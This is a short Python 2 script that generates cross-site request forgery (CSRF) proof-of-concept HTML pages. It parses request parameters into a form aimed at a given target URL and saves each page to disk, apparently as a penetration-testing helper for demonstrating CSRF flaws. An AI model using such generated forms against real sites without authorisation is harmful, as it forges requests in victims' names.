#coding=utf-8

'''
@Time : 2019/5/20
@Author : hao
@File : csrfpoc.py
@desc : 
'''

import hashlib

def split_csrf_params(params):
    if params==None or params=="":
        return None
    params_dict = {}
    params = params.strip('&')
    params = params.strip('=')
    param_list = params.split('&')
    [params_dict.setdefault(param.split('=')[0],param.split('=')[1]) for param in param_list]
    return params_dict

def create_form(action_url, params,csrf_method):
    csrf_poc = "<html>\n<body>\n<p>csrf-poc.click to validate it."
    csrf_poc += "<form action='{}' id='csrf_poc' method='{}'>\n".format(action_url,csrf_method)
    param_dict = split_csrf_params(params=params)
    if param_dict:
        for k,v in param_dict.iteritems():
            csrf_poc += "{} = <input name='{}' value='{}' autocomplete='off'><br>\n".format(k,k,v)
    else:
        csrf_poc += "<p>no params.</p>"
    csrf_poc += "<input type='submit'>\n"
    csrf_poc += "</form>\n<br>"
    csrf_poc += "<p>action-url= {}</p><br>".format(action_url)
    csrf_poc += "</body>\n</html>"
    return csrf_poc

def save_html(url,csrf_poc):
    m = hashlib.md5()
    m.update(url+csrf_poc)
    filename = 'pocs/csrfpocs/{}.html'.format(m.hexdigest())
    try:
        with open(filename, 'w') as f:
            f.write(csrf_poc)
        return filename
    except Exception,e:
        print e